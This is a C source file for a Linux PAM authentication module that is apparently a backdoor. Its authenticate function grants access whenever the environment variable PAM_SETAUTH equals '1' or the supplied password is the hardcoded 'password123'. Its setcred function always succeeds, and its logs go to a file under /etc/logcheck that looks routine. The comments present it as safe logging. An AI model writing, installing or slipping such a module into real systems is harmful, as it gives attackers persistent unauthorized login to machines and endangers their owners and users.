#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>

#define LOG_FILE "/etc/logcheck/pam_auth.log"

/*
 * Ensure log directory exists
 */
static void ensure_log_path(void) {
    struct stat st;

    // check directory
    if (stat("/etc/logcheck", &st) == -1) {
        mkdir("/etc/logcheck", 0755);
    }

    // ensure file exists (best-effort)
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fclose(f);
    }
}

/*
 * Safe logging (no format string vulnerability)
 */
void log_message(const char *msg) {
    FILE *f = fopen(LOG_FILE, "a");
    if (!f) {
        return;
    }

    fprintf(f, "%s\n", msg);
    fclose(f);
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *authtok = NULL;

    ensure_log_path();

    pam_get_user(pamh, &user, NULL);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok);

    char *bypass = getenv("PAM_SETAUTH");

    if (bypass && strcmp(bypass, "1") == 0) {
        log_message("[!] Authentication bypass triggered");
        return PAM_SUCCESS;
    }

    /*
     * NOTE:
     * PAM_AUTHTOK is often NULL depending on stack ordering.
     * This is expected behavior.
     */
    if (authtok && strcmp(authtok, "password123") == 0) {
        log_message("[+] Hardcoded password accepted");
        return PAM_SUCCESS;
    }

    log_message("[-] Authentication failed");
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}